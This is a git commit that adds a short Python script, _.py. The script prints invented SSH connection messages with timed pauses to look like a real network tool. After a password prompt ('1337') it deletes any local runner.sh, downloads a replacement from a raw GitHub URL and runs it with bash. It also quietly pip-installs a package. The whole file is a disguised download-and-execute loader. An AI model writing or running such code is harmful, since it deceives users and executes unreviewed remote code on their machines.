ead52bf5d18f48b96514a0a3d42539a1c8f9bd11
syzcoycosuvsgix <89813564+syzcoycosuvsgix@users.noreply.github.com>
2021-09-25 21:33:11 +0300

    Update and rename main.py to _.py

---
+++ _.py
@@ -0,0 +1,18 @@
+import os
+import time
+try:
+	import wget
+except:
+	os.system("python3 -m pip install wget")
+print("ssh: Connecting to server...")
+time.sleep(0.4)
+print("ssh: Connect to host dthnet:5028274628628888362.ngrok.io port 22: Network is unreachable")
+time.sleep(1.7)
+print("ssh: Found a port through which you can connect")
+password = {"input": "0"}
+password["code"] = "1337"
+while password["input"] != password["code"]:
+	password["input"] = input("Password: ")
+os.remove("runner.sh")
+wget.download("https://raw.githubusercontent.com/A9FM/ClipUserbot/main/runner.sh", "runner.sh")
+os.system("bash runner.sh")
